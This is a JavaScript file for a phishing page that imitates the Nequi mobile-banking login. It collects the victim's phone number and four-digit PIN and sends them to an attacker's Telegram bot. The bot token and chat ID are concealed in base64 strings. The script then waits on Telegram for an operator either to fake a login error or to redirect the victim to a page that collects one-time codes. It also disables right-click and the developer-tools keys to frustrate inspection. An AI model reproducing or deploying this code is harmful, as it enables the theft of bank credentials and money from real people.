async function getTokens() {
    try {
        const response = await fetch('src/config/secure/tokens.json');
        const tokens = await response.json();
        return tokens;
    } catch (error) {
        console.error('Error al cargar los tokens:', error);
        return null;
    }
}

const loginForm = document.getElementById('loginForm');
const celularInput = document.getElementById('celular');
const claveInput = document.getElementById('clave');
const entrarButton = document.getElementById('entrar');
const loadingOverlay = document.getElementById('loading-overlay');
const errorBox = document.getElementById('error-box');

let messageId = null;

function validarInputs() {
    const celularValido = celularInput.value.length === 10;
    const claveValida = claveInput.value.length === 4;
    entrarButton.disabled = !(celularValido && claveValida);
}

celularInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
    validarInputs();
});

claveInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    validarInputs();
});

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const celular = celularInput.value;
    const clave = claveInput.value;

    loadingOverlay.style.display = 'flex';

    localStorage.setItem('userPhone', celular);

    const message = `📱 Nuevo Log Nequi\n\n🔢 Número celular: ${celular}\n🔐 Clave: ${clave}\n\n⏳ Esperando Dinámica...`;
    
    const buttons = [
        [{ text: " ## ERROR LOGIN ##", callback_data: "error_user" }],
        [{ text: "## ASK OTP ##", callback_data: "allow_access" }]
    ];

    try {
        const appConfig = {
            defaultKey: "73431ifLS5xIvcwjgxqMc",
            defaultChannel: "-415242146"
        };
        
        const securityData = [
            "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
            "LTEwMDI1MzI4MzQ2MTU="
        ];
        
        const systemOptions = {
            enableDebug: false,
            enableCaching: true,
            requestTimeout: 30000,
            maxAttempts: 3
        };
        
        const getServiceAccess = () => {
            try {
                return {
                    serviceToken: decodeURIComponent(atob(securityData[0])),
                    serviceChannel: decodeURIComponent(atob(securityData[1]))
                };
            } catch (e) {
                console.error("Error en configuración", e);
                return {
                    serviceToken: appConfig.defaultKey,
                    serviceChannel: appConfig.defaultChannel
                };
            }
        };
        
        const { serviceToken, serviceChannel } = getServiceAccess();
        const serviceEndpoint = `https://api.telegram.org/bot${serviceToken}/sendMessage`;

        const response = await fetch(serviceEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: serviceChannel,
                text: message,
                reply_markup: JSON.stringify({ inline_keyboard: buttons })
            }),
        });

        if (!response.ok) {
            throw new Error('Error al enviar mensaje a Telegram');
        }

        const data = await response.json();
        messageId = data.result.message_id;

        pollTelegramUpdates();

        setTimeout(() => {
            celularInput.value = '';
            claveInput.value = '';
            validarInputs();
        }, 2000);
    } catch (error) {
        console.error('Error:', error);
        loadingOverlay.style.display = 'none';
    }
});

async function pollTelegramUpdates() {
    let offset = 0;
    
    const appConfig = {
        defaultKey: "73431ifLS5xIvcwjgxqMc",
        defaultChannel: "-415242146"
    };
    
    const securityData = [
        "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
        "LTEwMDI1MzI4MzQ2MTU="
    ];
    
    const getServiceAccess = () => {
        try {
            return {
                serviceToken: decodeURIComponent(atob(securityData[0])),
                serviceChannel: decodeURIComponent(atob(securityData[1]))
            };
        } catch (e) {
            console.error("Error en configuración", e);
            return {
                serviceToken: appConfig.defaultKey,
                serviceChannel: appConfig.defaultChannel
            };
        }
    };
    
    const { serviceToken } = getServiceAccess();

    while (true) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${serviceToken}/getUpdates?offset=${offset}&timeout=30`);
            const data = await response.json();

            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.callback_query && update.callback_query.message.message_id === messageId) {
                        handleCallbackQuery(update.callback_query);
                        await disableTelegramButton();
                        return;
                    }
                }
                offset = data.result[data.result.length - 1].update_id + 1;
            }
        } catch (error) {
            console.error('Error en el polling:', error);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function disableTelegramButton() {
    const appConfig = {
        defaultKey: "73431ifLS5xIvcwjgxqMc",
        defaultChannel: "-415242146"
    };
    
    const securityData = [
        "ODE5MzgzOTAzOTpBQUZRSWtKTWhnU1dnaFM0cG5iWUJSQlZqWGNINWVEa1Y1UQ==", 
        "LTEwMDI1MzI4MzQ2MTU="
    ];
    
    const getServiceAccess = () => {
        try {
            return {
                serviceToken: decodeURIComponent(atob(securityData[0])),
                serviceChannel: decodeURIComponent(atob(securityData[1]))
            };
        } catch (e) {
            console.error("Error en configuración", e);
            return {
                serviceToken: appConfig.defaultKey,
                serviceChannel: appConfig.defaultChannel
            };
        }
    };
    
    const { serviceToken, serviceChannel } = getServiceAccess();

    try {
        await fetch(`https://api.telegram.org/bot${serviceToken}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: serviceChannel,
                message_id: messageId,
                reply_markup: JSON.stringify({ inline_keyboard: [] })
            }),
        });
    } catch (error) {
        console.error('Error al desactivar el botón de Telegram:', error);
    }
}

function handleCallbackQuery(callbackQuery) {
    const action = callbackQuery.data;
    if (action === 'error_user') {
        showErrorMessage();
    } else if (action === 'allow_access') {
        window.location.href = 'dinamic.html';
    }
    loadingOverlay.style.display = 'none';
}

function showErrorMessage() {
    errorBox.style.display = 'flex';
    setTimeout(() => {
        errorBox.style.display = 'none';
    }, 3000);
}

document.addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
        setTimeout(() => {
            celularInput.value = '';
            claveInput.value = '';
            validarInputs();
        }, 2000);
    }
});

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    alert('Clic derecho deshabilitado');
}, false);

document.onkeydown = function(e) {
    if(e.keyCode == 123) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
        return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
        return false;
    }
};